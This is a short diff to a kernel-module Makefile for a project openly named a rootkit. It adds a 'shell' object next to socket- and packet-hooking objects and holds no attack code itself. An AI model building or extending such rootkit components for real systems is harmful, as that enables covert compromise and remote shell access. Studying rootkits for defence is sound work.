@@ -20,6 +20,7 @@ REMOTE_PACKET_HEADER_LOCATION := $(KERNEL_SOURCE)/net/packet/internal.h?h=v$(KER
 $(ROOTKIT)-y 	+= src/main.o
 $(ROOTKIT)-y 	+= src/networking.o
 $(ROOTKIT)-y 	+= src/sockets.o
+$(ROOTKIT)-y 	+= src/shell.o
 $(ROOTKIT)-y 	+= src/socket/hook.o
 $(ROOTKIT)-y 	+= src/socket/packet_hook.o
 
